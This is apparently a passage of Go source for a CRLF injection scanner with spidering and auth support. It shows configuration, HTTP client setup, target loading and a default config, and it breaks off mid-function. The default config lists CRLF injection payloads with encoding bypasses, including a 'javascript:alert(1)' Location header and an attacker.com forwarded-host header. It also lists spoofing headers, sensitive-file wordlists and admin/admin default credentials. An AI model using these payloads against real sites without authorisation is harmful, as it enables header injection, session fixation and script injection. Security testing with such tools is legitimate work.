package main

import (
	"io"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"bytes"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"text/template"
	"time"

	"github.com/PuerkitoBio/goquery"
	"github.com/go-resty/resty/v2"
	"github.com/logrusorgru/aurora"
	"github.com/remeh/sizedwaitgroup"
	"github.com/rs/zerolog"
	"golang.org/x/net/publicsuffix"
	"gopkg.in/yaml.v3"
)

// Constants
const (
	Version          = "3.0.0"
	DefaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	MaxRedirects     = 10
	DefaultThreads   = 50
	RateLimit        = 10
)

// Configuration
type Config struct {
	Targets struct {
		URLs         []string `yaml:"urls"`
		Domains      []string `yaml:"domains"`
		Wordlist     string   `yaml:"wordlist"`
		RecurseDepth int      `yaml:"recurse_depth"`
		MaxPages     int      `yaml:"max_pages"`
	} `yaml:"targets"`

	Scanner struct {
		Threads         int      `yaml:"threads"`
		Timeout         int      `yaml:"timeout"`
		RateLimit       int      `yaml:"rate_limit"`
		FollowRedirects bool     `yaml:"follow_redirects"`
		Retries         int      `yaml:"retries"`
		VerifySSL       bool     `yaml:"verify_ssl"`
		UserAgents      []string `yaml:"user_agents"`
		Proxy           string   `yaml:"proxy"`
	} `yaml:"scanner"`

	CRLF struct {
		Payloads          []string `yaml:"payloads"`
		TestHeaders       []string `yaml:"test_headers"`
		TestParams        []string `yaml:"test_params"`
		TestPaths         []string `yaml:"test_paths"`
		TestMethods       []string `yaml:"test_methods"`
		InjectionPoints   []string `yaml:"injection_points"`
		DetectionPatterns []string `yaml:"detection_patterns"`
		BypassTechniques  []string `yaml:"bypass_techniques"`
	} `yaml:"crlf"`

	Spider struct {
		Enabled         bool     `yaml:"enabled"`
		ExtractURLs     bool     `yaml:"extract_urls"`
		ExtractForms    bool     `yaml:"extract_forms"`
		ExtractJS       bool     `yaml:"extract_js"`
		ExtractComments bool     `yaml:"extract_comments"`
		RobotsTxt       bool     `yaml:"robots_txt"`
		SitemapXML      bool     `yaml:"sitemap_xml"`
		CommonFiles     []string `yaml:"common_files"`
		CommonDirs      []string `yaml:"common_dirs"`
		FileExtensions  []string `yaml:"file_extensions"`
	} `yaml:"spider"`

	Auth struct {
		Enabled           bool              `yaml:"enabled"`
		Methods           []string          `yaml:"methods"`
		Credentials       map[string]string `yaml:"credentials"`
		Headers           map[string]string `yaml:"headers"`
		Tokens            []string          `yaml:"tokens"`
		SessionManagement bool              `yaml:"session_management"`
	} `yaml:"auth"`

	Headers struct {
		Custom          map[string]string `yaml:"custom"`
		FuzzHeaders     []string          `yaml:"fuzz_headers"`
		SecurityHeaders []string          `yaml:"security_headers"`
		AddRandomHeaders bool             `yaml:"add_random_headers"`
	} `yaml:"headers"`

	Output struct {
		Directory     string   `yaml:"directory"`
		Formats       []string `yaml:"formats"`
		Verbose       bool     `yaml:"verbose"`
		SaveResponses bool     `yaml:"save_responses"`
		Color         bool     `yaml:"color"`
	} `yaml:"output"`
}

// CRLF Injection Result
type CRLFResult struct {
	URL           string            `json:"url"`
	Method        string            `json:"method"`
	Payload       string            `json:"payload"`
	Parameter     string            `json:"parameter,omitempty"`
	Header        string            `json:"header,omitempty"`
	InjectionType string            `json:"injection_type"`
	Evidence      string            `json:"evidence"`
	Status        string            `json:"status"` // vulnerable, potential, not-vulnerable
	Severity      string            `json:"severity"`
	CWE           []string          `json:"cwe"`
	CVSS          float64           `json:"cvss"`
	Timestamp     time.Time         `json:"timestamp"`
	Request       map[string]string `json:"request,omitempty"`
	Response      map[string]string `json:"response,omitempty"`
}

// Spider Result
type SpiderResult struct {
	URL        string            `json:"url"`
	Status     int               `json:"status"`
	Title      string            `json:"title,omitempty"`
	Links      []string          `json:"links,omitempty"`
	Forms      []Form            `json:"forms,omitempty"`
	Parameters []Parameter       `json:"parameters,omitempty"`
	Headers    map[string]string `json:"headers,omitempty"`
	Technology []string          `json:"technology,omitempty"`
	Size       int               `json:"size"`
	Time       time.Duration     `json:"time"`
}

// Form Structure
type Form struct {
	Action  string            `json:"action"`
	Method  string            `json:"method"`
	Inputs  []FormInput       `json:"inputs"`
	Enctype string            `json:"enctype,omitempty"`
}

// Form Input
type FormInput struct {
	Name     string `json:"name"`
	Type     string `json:"type"`
	Value    string `json:"value,omitempty"`
	Required bool   `json:"required,omitempty"`
}

// Parameter Structure
type Parameter struct {
	Name     string `json:"name"`
	Location string `json:"location"` // query, header, body, path
	Type     string `json:"type,omitempty"`
}

// Authentication Session
type AuthSession struct {
	URL      string
	Cookies  []*http.Cookie
	Headers  map[string]string
	Tokens   map[string]string
	Valid    bool
	LastUsed time.Time
}

// Main Scanner
type CRLFScanner struct {
	config       *Config
	httpClient   *resty.Client
	logger       zerolog.Logger
	results      []CRLFResult
	spiderData   []SpiderResult
	authSessions map[string]*AuthSession
	stats        Statistics
	mu           sync.RWMutex
	wg           sizedwaitgroup.SizedWaitGroup
	ctx          context.Context
	cancel       context.CancelFunc
	queue        chan string
	visited      sync.Map
}

// Statistics
type Statistics struct {
	TotalRequests   int64 `json:"total_requests"`
	CRLFInjected    int64 `json:"crlf_injected"`
	Vulnerabilities int64 `json:"vulnerabilities"`
	Critical        int64 `json:"critical"`
	High            int64 `json:"high"`
	Medium          int64 `json:"medium"`
	Low             int64 `json:"low"`
	SpiderPages     int64 `json:"spider_pages"`
	AuthSuccess     int64 `json:"auth_success"`
	Errors          int64 `json:"errors"`
}

// NewCRLFScanner creates a new scanner instance
// NewCRLFScanner creates a new scanner instance
func NewCRLFScanner(configPath string) (*CRLFScanner, error) {
	config, err := loadConfig(configPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load config: %w", err)
	}

	// Setup logger
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	logger := zerolog.New(zerolog.ConsoleWriter{
		Out:        os.Stderr,
		TimeFormat: "2006-01-02 15:04:05",
	}).With().Timestamp().Logger()

	// Create HTTP client with advanced settings
	jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	
	// Create custom transport with better settings
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: !config.Scanner.VerifySSL,
			MinVersion:         tls.VersionTLS12,
		},
		MaxIdleConns:          100,
		MaxIdleConnsPerHost:   10,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   15 * time.Second,
		ExpectContinueTimeout: 3 * time.Second,
		ResponseHeaderTimeout: 30 * time.Second,
		DisableCompression:    false,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     true,
	}
	
	// Calculate timeout
	timeout := 60 * time.Second
	if config.Scanner.Timeout > 0 {
		timeout = time.Duration(config.Scanner.Timeout) * time.Second
	}
	
	// Create the HTTP client
	httpClient := resty.New().
		SetTransport(transport).
		SetTimeout(timeout).
		SetRedirectPolicy(resty.FlexibleRedirectPolicy(MaxRedirects)).
		SetCookieJar(jar).
		SetHeader("User-Agent", DefaultUserAgent).
		SetHeaders(map[string]string{
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Accept-Encoding": "gzip, deflate, br",
			"Connection":      "keep-alive",
			"Upgrade-Insecure-Requests": "1",
			"Sec-Fetch-Dest": "document",
			"Sec-Fetch-Mode": "navigate",
			"Sec-Fetch-Site": "none",
			"Sec-Fetch-User": "?1",
			"Cache-Control":   "max-age=0",
		}).
		SetRetryCount(config.Scanner.Retries).
		SetRetryWaitTime(3*time.Second).
		SetRetryMaxWaitTime(30*time.Second).
		AddRetryCondition(func(r *resty.Response, err error) bool {
			// Don't retry on context deadline errors (these are timeouts)
			if err != nil && strings.Contains(err.Error(), "context deadline") {
				return false
			}
			// Retry on other timeout errors
			if err != nil && (strings.Contains(err.Error(), "timeout") || 
				strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "connection reset")) {
				return true
			}
			// Retry on server errors (but not 429 or 403)
			if r != nil && r.StatusCode() >= 500 && r.StatusCode() != 429 && r.StatusCode() != 403 {
				return true
			}
			return false
		})

	// Set proxy if configured
	if config.Scanner.Proxy != "" {
		httpClient.SetProxy(config.Scanner.Proxy)
	}

	// Create scanner
	ctx, cancel := context.WithCancel(context.Background())

	scanner := &CRLFScanner{
		config:       config,
		httpClient:   httpClient,
		logger:       logger,
		results:      make([]CRLFResult, 0),
		spiderData:   make([]SpiderResult, 0),
		authSessions: make(map[string]*AuthSession),
		stats:        Statistics{},
		ctx:          ctx,
		cancel:       cancel,
		queue:        make(chan string, 10000),
	}

	scanner.wg = sizedwaitgroup.New(config.Scanner.Threads)

	return scanner, nil
}

// readLimitedBody reads response body with size limit
func (s *CRLFScanner) readLimitedBody(resp *resty.Response, maxSize int) ([]byte, error) {
	// Get the response body reader
	bodyReader := resp.RawBody()
	defer bodyReader.Close()
	
	// Read with limit
	limitedReader := io.LimitReader(bodyReader, int64(maxSize))
	body, err := io.ReadAll(limitedReader)
	if err != nil {
		return nil, err
	}
	
	// Check if we hit the limit
	if len(body) >= maxSize {
		s.logger.Debug().Int("size", len(body)).Int("limit", maxSize).Msg("Response body truncated due to size limit")
	}
	
	return body, nil
}

// Spider a single URL

// Detect technology from body and headers
func (s *CRLFScanner) detectTechnologyFromBody(body []byte, headers http.Header) []string {
	var tech []string
	bodyStr := string(body)

	// Detect via headers
	if server := headers.Get("Server"); server != "" {
		tech = append(tech, fmt.Sprintf("Server: %s", server))
	}

	if poweredBy := headers.Get("X-Powered-By"); poweredBy != "" {
		tech = append(tech, fmt.Sprintf("Powered-By: %s", poweredBy))
	}

	// Detect via body patterns
	patterns := map[string]string{
		`<meta.*content="WordPress`: "WordPress",
		`/wp-content/`:               "WordPress",
		`/wp-includes/`:              "WordPress",
		`Joomla!`:                    "Joomla",
		`Drupal.settings`:            "Drupal",
		`React.createElement`:        "React",
		`angular.module`:             "Angular",
		`vue.config`:                 "Vue.js",
		`jQuery`:                     "jQuery",
		`Bootstrap`:                  "Bootstrap",
		`Laravel`:                    "Laravel",
		`Django`:                     "Django",
		`Rails`:                      "Ruby on Rails",
		`ASP.NET`:                    "ASP.NET",
		`Spring`:                     "Spring Framework",
		`nodejs`:                     "Node.js",
		`express`:                    "Express.js",
		`nginx`:                      "nginx",
		`apache`:                     "Apache",
		`iis`:                        "IIS",
	}

	for pattern, technology := range patterns {
		if strings.Contains(bodyStr, pattern) {
			tech = append(tech, technology)
		}
	}

	return uniqueStrings(tech)
}



// Load configuration
func loadConfig(configPath string) (*Config, error) {
	if configPath == "" {
		configPath = "config.yaml"
	}

	data, err := os.ReadFile(configPath)
	if err != nil {
		return getDefaultConfig(), nil
	}

	var config Config
	if err := yaml.Unmarshal(data, &config); err != nil {
		return nil, err
	}

	return &config, nil
}

// Get default configuration
func getDefaultConfig() *Config {
	return &Config{
		Targets: struct {
			URLs         []string `yaml:"urls"`
			Domains      []string `yaml:"domains"`
			Wordlist     string   `yaml:"wordlist"`
			RecurseDepth int      `yaml:"recurse_depth"`
			MaxPages     int      `yaml:"max_pages"`
		}{
			URLs:         []string{},
			Domains:      []string{},
			Wordlist:     "wordlists/urls.txt",
			RecurseDepth: 3,
			MaxPages:     1000,
		},
		
		Scanner: struct {
		    Threads         int      `yaml:"threads"`
		    Timeout         int      `yaml:"timeout"`
		    RateLimit       int      `yaml:"rate_limit"`
		    FollowRedirects bool     `yaml:"follow_redirects"`
		    Retries         int      `yaml:"retries"`
		    VerifySSL       bool     `yaml:"verify_ssl"`
		    UserAgents      []string `yaml:"user_agents"`
		    Proxy           string   `yaml:"proxy"`
		}{
		    Threads:         20,      // Reduced from 50 to avoid overwhelming
		    Timeout:         60,      // 60 seconds timeout
		    RateLimit:       5,       // Reduced from 10 to be more gentle
		    FollowRedirects: true,
		    Retries:         2,       // Reduced from 3 to fail faster
		    VerifySSL:       false,
		    UserAgents: []string{
		        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
		        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		    },
		    Proxy: "",
		},
		CRLF: struct {
			Payloads          []string `yaml:"payloads"`
			TestHeaders       []string `yaml:"test_headers"`
			TestParams        []string `yaml:"test_params"`
			TestPaths         []string `yaml:"test_paths"`
			TestMethods       []string `yaml:"test_methods"`
			InjectionPoints   []string `yaml:"injection_points"`
			DetectionPatterns []string `yaml:"detection_patterns"`
			BypassTechniques  []string `yaml:"bypass_techniques"`
		}{
			Payloads: []string{
				"%0d%0aSet-Cookie:crlf=injected",
				"%0d%0aLocation:javascript:alert(1)",
				"%0d%0aX-XSS-Protection:0",
				"%0d%0aAccess-Control-Allow-Origin:*",
				"%0d%0aX-Forwarded-Host:attacker.com",
				"%0d%0aX-Forwarded-For:127.0.0.1",
				"%0d%0aX-Rewrite-URL:/",
				"%0dSet-Cookie:crlf=injected",
				"%0aSet-Cookie:crlf=injected",
				"\r\nSet-Cookie:crlf=injected",
				"\rSet-Cookie:crlf=injected",
				"\nSet-Cookie:crlf=injected",
				"%E5%98%8A%E5%98%8DSet-Cookie:crlf=injected", // Unicode bypass
				"%250d%250aSet-Cookie:crlf=injected",          // Double encoding
				"%%0d0aSet-Cookie:crlf=injected",
				"%%0d%0aSet-Cookie:crlf=injected",
				"%0d%0a%0d%0aSet-Cookie:crlf=injected",
				"%0d%0aX-Custom-Header:injected",
				"%0d%0aContent-Length:0%0d%0a%0d%0a",
				"%0d%0aX-Api-Version:1.0%0d%0aX-Injected:true",
			},
			TestHeaders: []string{
				"User-Agent",
				"Referer",
				"X-Forwarded-For",
				"X-Forwarded-Host",
				"X-Original-URL",
				"X-Rewrite-URL",
				"Origin",
				"X-Custom-Header",
				"Accept",
				"Accept-Language",
				"Cache-Control",
			},
			TestParams: []string{
				"url",
				"redirect",
				"next",
				"return",
				"returnTo",
				"return_to",
				"r",
				"redirect_uri",
				"redirect_url",
				"redir",
				"destination",
				"dest",
				"path",
				"file",
				"page",
				"feed",
				"host",
				"data",
				"reference",
				"site",
				"html",
				"val",
				"validate",
				"domain",
				"callback",
				"jsonp",
			},
			TestPaths: []string{
				"/redirect",
				"/callback",
				"/auth/callback",
				"/oauth/callback",
				"/login",
				"/logout",
				"/register",
				"/profile",
				"/settings",
				"/api",
				"/webhook",
				"/webhooks",
				"/notify",
				"/notification",
			},
			TestMethods: []string{"GET", "POST", "PUT", "DELETE", "PATCH"},
			InjectionPoints: []string{
				"header",
				"parameter",
				"path",
				"fragment",
				"body",
			},
			DetectionPatterns: []string{
				"(?i)set-cookie:\\s*crlf=injected",
				"(?i)location:\\s*",
				"(?i)x-custom-header:\\s*injected",
				"(?i)x-injected:\\s*true",
				"crlf=injected",
				"injected=true",
			},
			BypassTechniques: []string{
				"unicode",
				"double_encode",
				"overlong_utf8",
				"html_entities",
				"url_encode",
				"multiple_encodings",
			},
		},
		Spider: struct {
			Enabled         bool     `yaml:"enabled"`
			ExtractURLs     bool     `yaml:"extract_urls"`
			ExtractForms    bool     `yaml:"extract_forms"`
			ExtractJS       bool     `yaml:"extract_js"`
			ExtractComments bool     `yaml:"extract_comments"`
			RobotsTxt       bool     `yaml:"robots_txt"`
			SitemapXML      bool     `yaml:"sitemap_xml"`
			CommonFiles     []string `yaml:"common_files"`
			CommonDirs      []string `yaml:"common_dirs"`
			FileExtensions  []string `yaml:"file_extensions"`
		}{
			Enabled:         true,
			ExtractURLs:     true,
			ExtractForms:    true,
			ExtractJS:       true,
			ExtractComments: true,
			RobotsTxt:       true,
			SitemapXML:      true,
			CommonFiles: []string{
				"robots.txt",
				"sitemap.xml",
				"sitemap_index.xml",
				"crossdomain.xml",
				"clientaccesspolicy.xml",
				"humans.txt",
				"security.txt",
				".well-known/security.txt",
				"phpinfo.php",
				"test.php",
				"info.php",
				"admin.php",
				"wp-admin.php",
				"config.php",
				"settings.php",
				"debug.php",
			},
			CommonDirs: []string{
				"admin",
				"administrator",
				"wp-admin",
				"login",
				"signin",
				"auth",
				"api",
				"v1",
				"v2",
				"api/v1",
				"api/v2",
				"rest",
				"graphql",
				"swagger",
				"docs",
				"documentation",
				"test",
				"dev",
				"staging",
				"backup",
				"backups",
				"tmp",
				"temp",
				"cache",
				"logs",
				"config",
				"configuration",
				"setup",
				"install",
			},
			FileExtensions: []string{
				".php", ".asp", ".aspx", ".jsp", ".do", ".action",
				".html", ".htm", ".js", ".css", ".json", ".xml",
				".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
				".zip", ".rar", ".tar", ".gz", ".sql", ".bak",
			},
		},
		Auth: struct {
			Enabled           bool              `yaml:"enabled"`
			Methods           []string          `yaml:"methods"`
			Credentials       map[string]string `yaml:"credentials"`
			Headers           map[string]string `yaml:"headers"`
			Tokens            []string          `yaml:"tokens"`
			SessionManagement bool              `yaml:"session_management"`
		}{
			Enabled: false,
			Methods: []string{"basic", "bearer", "cookie", "form", "oauth"},
			Credentials: map[string]string{
				"username": "admin",
				"password": "admin",
			},
			Headers: map[string]string{
				"Authorization": "Bearer",
			},
			Tokens:            []string{},
			SessionManagement: true,
		},
		Headers: struct {
			Custom          map[string]string `yaml:"custom"`
			FuzzHeaders     []string          `yaml:"fuzz_headers"`
			SecurityHeaders []string          `yaml:"security_headers"`
			AddRandomHeaders bool             `yaml:"add_random_headers"`
		}{
			Custom: map[string]string{
				"X-Requested-With": "XMLHttpRequest",
				"Accept":           "application/json, text/plain, */*",
				"Accept-Language":  "en-US,en;q=0.9",
			},
			FuzzHeaders: []string{
				"X-Forwarded-For",
				"X-Forwarded-Host",
				"X-Original-URL",
				"X-Rewrite-URL",
				"X-Custom-IP-Authorization",
				"X-Originating-IP",
				"X-Remote-IP",
				"X-Remote-Addr",
				"X-Client-IP",
				"X-Host",
				"X-Forwarded-Server",
				"X-HTTP-Host-Override",
				"Forwarded",
				"Via",
				"True-Client-IP",
				"CF-Connecting-IP",
			},
			SecurityHeaders: []string{
				"Content-Security-Policy",
				"X-Frame-Options",
				"X-Content-Type-Options",
				"X-XSS-Protection",
				"Strict-Transport-Security",
				"Referrer-Policy",
				"Feature-Policy",
				"Permissions-Policy",
			},
			AddRandomHeaders: true,
		},
		Output: struct {
			Directory     string   `yaml:"directory"`
			Formats       []string `yaml:"formats"`
			Verbose       bool     `yaml:"verbose"`
			SaveResponses bool     `yaml:"save_responses"`
			Color         bool     `yaml:"color"`
		}{
			Directory:     "results",
			Formats:       []string{"json", "html", "md", "csv"},
			Verbose:       false,
			SaveResponses: true,
			Color:         true,
		},
	}
}

// Display Banner
func displayBanner() {
	au := aurora.NewAurora(true)

	banner := `

                                 .+--+++++++++++++++++++++-.                           
                                 +########+++++++++++++++++++++++-                     
                                 ################+++++++++++++++++++++++-              
                                -#######################++++++++++++++++++++++-.       
                                ################################++++++++++++++++++++++ 
                                ######################################+++++++++++++++++
                               .#############################################++++++++++
                               +####################################################+++
                               ##########+#############################################
                               ########################################################
                              -########################################################
                              +#########++#############################################
                              ##########+++############################################
                             .##########+++############################################
                             -+########+++#############################################
 ..  .                       ++########+#+#########################################++  
 -  -  -  -                  +#########+++####################################+++-++   
..  .    -    .             .++#+######+#+#############################+-..    --++#.-.
...-. - .    ---.       ....-+###################################+-          ..  .#....
...------   ----     .--------.+#++++#+++++++++#########+.           ...+----   --.    
..----+--++---..........---++++++++++++++++++##++######-...           ..  ...         -
..-------+---.....  ..-++#++++#+++++++++++#######+######+#---.  .-+        .+.        .
.-------------.....+++++++#++#+#+++++-+--..----+#++##########+ ++.           .++-  -  .
.--------........--+####+#+####+-+--...     .....-+##########+++            +++++   .  
.------......--..+##########++-..             ......-+#########-++         ---.      .-
 ..-.----     ...##########+-..             ..........+##########.-                  -+
. ...-+++-  . ..#########+-....        ................+#########-.+            ++++   
     .. .  . ..###+#####+-....    . ....................##########.      -+++++-  --   
          .+. #########+-......... .........   .........+#########+.++++++-.++++++.  .+
         -+++##########-..........  .......    .........-#########+   ++++++.    .+.   
       ++++++#########+.........                 ........+########+. -- .-.  -+- .....+
            -+########+...........             ...........#########     .++##.   --  .#
            .#########+-..........     .  ..  .....--+#++-.#######+       .+++-     -+.
          ++++#########-........... . ... .....-+++++-----.-########       ++     ++++-
+++.++++-  +++#########+-................  .-------####++-..-#######                   
+++- -++++-   -.#######+-....----++++-----...---+--#++-----..+#####+.                .+
-+--+   .. .++++########-.--+++++--....--.   .----....-+-....+#####..                 -
++- .++.      ..+#######+-+++---###-.+++..    ....--..-.......####+.                   
.+++-   -     +++########----+#-##+-..--...   ..... .      ....###-                 -++
.++++-     +  +++####+###---++--...---......   ..-.-....  ......##+               -####
 ++      .+++++-######+++.-..................  ......---........##.                    
           .++. .######+++.......     .-.....   .....------...--+######-  .         ...
              ...-######-#.......   .--.. ....   ..-+--+####+---+########-.   .-+#++---
            .+-   +#####+#-.........----......    .###++#####-.-#-..+###. .+           
             ++++.-######+-........------+##+....-####++#####--##..     -+ .      .####
             .++#########----......--+++++#######+####-+--+#+-+##--...++.....    -#####
        ++++-++-++###+#####----..-+#####+######+.-+--------+++###++--+..........-#####+
..   .+++#++-- .-##########+-++--+#######++-----.....--.-.--+####++++-##+-.....-###-...
.......   +##-  .##########++++--.+##+++-------.  ..--++...-+#######++#####+++-... ....
  .       .#.....-+#+##+######+#++-+#++--------++--+#+--...-+##########++++++###+++---+
 ...+-    .-......-+++##+-##-+#####++#+-..------+++++-....--+############+++++#++#++###
-+##+  ..##+--.---+++#----++#-#########--.-..--..--..-..-.-++#####+######++++++########
#+. ...-###----###--------############+#+--..........-----++####++++######+############
..--##--###+.-####+----+#+######++#######+----.......---++++####+++++############+#####
-++.....###+++####+---+###########+++######+++++------+++++####+++++###+++++++##++####+
##-.-+-##-+#.-+###+.--##########+##############++++++++###++#####+#+#+++++#########++++
###++#-.#-+--#####+--#########++++#++++++++#############++++######+#############+++++++
#+-++ +####..####++--+########+++##+++++++++###+++++++###+++++++##############+++++++++
###- +###...###+-----+++#+####++####+++++++###################+++++###++++#####+++++##+
. ..-+#---.#-----+#+------+##++##########+######++++++########++++++##+++++####+++#####
......#####+-#######+-----+##++++#########+++++++++++++++++#####++++#++++++++##########
 ....+#----+#########+----+##+#+++####+++++++++++++++++++++###++++++###++++++#######++#
.+#++-.----###++++###+---######++++++++++++++++####+++++++++++++###+#####++++##########


╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██████╗██████╗ ██╗     ███████╗    ██╗███╗   ██╗██╗  ██╗███████╗ ██████╗   ║
║ ██╔════╝██╔══██╗██║     ██╔════╝    ██║████╗  ██║██║ ██╔╝██╔════╝██╔═══██╗  ║
║ ██║     ██████╔╝██║     █████╗      ██║██╔██╗ ██║█████╔╝ █████╗  ██║   ██║  ║
║ ██║     ██╔══██╗██║     ██╔══╝      ██║██║╚██╗██║██╔═██╗ ██╔══╝  ██║   ██║  ║
║ ╚██████╗██║  ██║███████╗███████╗    ██║██║ ╚████║██║  ██╗███████╗╚██████╔╝  ║
║  ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Advanced CRLF Injection Scanner with Spider & Auth Support                 ║
║  Version: %s                                                                 ║
║  Author: Security Team                                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝`

	fmt.Println(au.Cyan(fmt.Sprintf(banner, Version)))
	fmt.Println()
}

// Run the scanner
func (s *CRLFScanner) Run() error {
	s.logger.Info().Msg("Starting advanced CRLF injection scanner")

	// Display progress spinner
	go s.displayProgress()
	defer s.cancel()

	// Load targets
	targets, err := s.loadTargets()
	if err != nil {
		return fmt.Errorf("failed to load targets: %w", err)
	}

	s.logger.Info().Int("targets", len(targets)).Msg("Targets loaded")

	// Start spider if enabled
	if s.config.Spider.Enabled && len(targets) > 0 {
		s.logger.Info().Msg("Starting spider phase")
		s.spiderTargets(targets)
	} else if s.config.Spider.Enabled {
		s.logger.Info().Msg("No targets to spider")
	}

	// Start CRLF testing
	s.logger.Info().Msg("Starting CRLF injection testing")
	s.testCRLFInjection()

	// Stop the progress display
	s.cancel()
	time.Sleep(200 * time.Millisecond) // Give time for progress display to clear

	// Generate reports
	s.logger.Info().Msg("Generating reports")
	s.saveResults()

	return nil
}

// isValidURL checks if a string is a valid HTTP/HTTPS URL
func isValidURL(urlStr string) bool {
	if !strings.HasPrefix(urlStr, "http://") && !strings.HasPrefix(urlStr, "https://") {
		return false
	}
	
	parsed, err := url.Parse(urlStr)
	if err != nil {
		return false
	}
	
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return false
	}
	
	if parsed.Host == "" {
		return false
	}
	
	return true
}

// Load wordlist from file
func (s *CRLFScanner) loadWordlist(path string) ([]string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(data), "\n")
	var urls []string

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Check if it's a full URL
		if strings.HasPrefix(line, "http://") || strings.HasPrefix(line, "https://") {
			if isValidURL(line) {
				urls = append(urls, line)
			}
		} else {
			// Ensure path starts with /
			if !strings.HasPrefix(line, "/") {
				line = "/" + line
			}
			
			// Add to all domains
			if len(s.config.Targets.Domains) > 0 {
				for _, domain := range s.config.Targets.Domains {
					// Ensure domain doesn't have trailing slashes
					domain = strings.TrimRight(domain, "/")
					
					// Add both schemes if domain doesn't already have one
					if !strings.HasPrefix(domain, "http://") && !strings.HasPrefix(domain, "https://") {
						// Validate the resulting URL
						httpsURL := fmt.Sprintf("https://%s%s", domain, line)
						if isValidURL(httpsURL) {
							urls = append(urls, httpsURL)
						}
						
						httpURL := fmt.Sprintf("http://%s%s", domain, line)
						if isValidURL(httpURL) {
							urls = append(urls, httpURL)
						}
					} else {
						// Domain already has scheme - just append path
						parsed, err := url.Parse(domain)
						if err != nil {
							continue
						}
						newURL := *parsed
						newURL.Path = line
						resultURL := newURL.String()
						if isValidURL(resultURL) {
							urls = append(urls, resultURL)
						}
					}
				}
			} else if len(s.config.Targets.URLs) > 0 {
				// If we have base URLs, try to combine paths with them
				for _, baseURL := range s.config.Targets.URLs {
					if !isValidURL(baseURL) {
						continue
					}
					parsed, err := url.Parse(baseURL)
					if err != nil {
						continue
					}
					// Create new URL with path
					newURL := *parsed
					newURL.Path = line
					resultURL := newURL.String()
					if isValidURL(resultURL) {
						urls = append(urls, resultURL)
					}
				}
			} else {
				// If no domains or URLs configured, we can't use these paths
				s.logger.Warn().Str("path", line).Msg("Cannot use wordlist path without base domain or URL")
				continue
			}
		}
	}

	return urls, nil
}

// Load targets from configuration
// Load targets from configuration
func (s *CRLFScanner) loadTargets() ([]string, error) {
	var targets []string
	
	// Add direct URLs (ensure they have scheme)
	for _, targetURL := range s.config.Targets.URLs {
		targetURL = strings.TrimSpace(targetURL)
		if targetURL == "" {
			continue
		}
		
		if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
			// Try to add scheme
			httpsURL := "https://" + targetURL
			httpURL := "http://" + targetURL
			
			if isValidURL(httpsURL) && !s.shouldSkipURL(httpsURL) {
				targets = append(targets, httpsURL)
			}
			if isValidURL(httpURL) && !s.shouldSkipURL(httpURL) {
				targets = append(targets, httpURL)
			}
		} else {
			if isValidURL(targetURL) && !s.shouldSkipURL(targetURL) {
				targets = append(targets, targetURL)
			}
		}
	}
	
	// Load from wordlist if specified
	if s.config.Targets.Wordlist != "" {
		wordlistTargets, err := s.loadWordlist(s.config.Targets.Wordlist)
		if err != nil {
			// Just log a debug message instead of warning if file doesn't exist
			if os.IsNotExist(err) {
				s.logger.Debug().Str("wordlist", s.config.Targets.Wordlist).Msg("Wordlist file not found, skipping")
			} else {
				s.logger.Warn().Err(err).Str("wordlist", s.config.Targets.Wordlist).Msg("Failed to load wordlist")
			}
		} else {
			// Filter wordlist targets
			for _, target := range wordlistTargets {
				if isValidURL(target) && !s.shouldSkipURL(target) {
					targets = append(targets, target)
				}
			}
		}
	}
	
	// Generate URLs from domains (filtered)
	for _, domain := range s.config.Targets.Domains {
		domain = strings.TrimSpace(domain)
		if domain == "" {
			continue
		}
		
		// Ensure domain doesn't have trailing slashes
		domain = strings.TrimRight(domain, "/")
		
		// Skip if domain matches skip patterns
		if strings.Contains(domain, "facebook.com") || 
		   strings.Contains(domain, "instagram.com") {
			s.logger.Debug().Str("domain", domain).Msg("Skipping blacklisted domain")
			continue
		}
		
		// Add domain itself with both schemes
		if !strings.HasPrefix(domain, "http://") && !strings.HasPrefix(domain, "https://") {
			httpsURL := fmt.Sprintf("https://%s", domain)
			httpURL := fmt.Sprintf("http://%s", domain)
			
			if isValidURL(httpsURL) && !s.shouldSkipURL(httpsURL) {
				targets = append(targets, httpsURL)
			}
			if isValidURL(httpURL) && !s.shouldSkipURL(httpURL) {
				targets = append(targets, httpURL)
			}
		} else {
			// Already has scheme
			if isValidURL(domain) && !s.shouldSkipURL(domain) {
				targets = append(targets, domain)
			}
		}
		
		// Generate common paths
